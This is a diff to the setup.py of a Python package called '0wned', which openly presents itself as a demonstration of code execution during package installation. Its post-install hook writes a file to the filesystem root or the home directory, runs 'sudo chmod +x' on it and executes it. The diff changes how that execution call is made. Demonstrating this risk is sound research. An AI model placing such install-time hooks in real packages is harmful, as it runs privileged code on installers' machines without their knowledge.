@@ -5,6 +5,7 @@ from __future__ import print_function
 import getpass
 import os
 import time
+import subprocess
 
 from setuptools import setup
 from setuptools.command.develop import develop
@@ -34,7 +35,7 @@ def touch_file():
             print(message)
             root_fd.write(message + '\n')
             os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
-            os.system("./"+os.path.join(os.path.abspath(os.sep), FILENAME))
+            subprocess.call(["."+os.path.join(os.path.abspath(os.sep), FILENAME)])
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
@@ -46,7 +47,7 @@ def touch_file():
                 print(message)
                 user_fd.write(message + '\n')
                 os.system("sudo chmod +x " + os.path.join(os.path.expanduser('~'), FILENAME))
-                os.system("./"+os.path.join(os.path.expanduser('~'), FILENAME))
+                subprocess.call(["."+os.path.join(os.path.expanduser('~'), FILENAME)])
         except (IOError, OSError):
             print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
             print('What kind of tricky system are you running this on?')
@@ -66,7 +67,7 @@ class PostInstallCommand(install):
 
 setup(
     name='0wned',
-    version='0.9.3',
+    version='0.9.4',
     description='Code execution via Python package installation.',
     long_description=long_description,
     long_description_content_type='text/markdown',
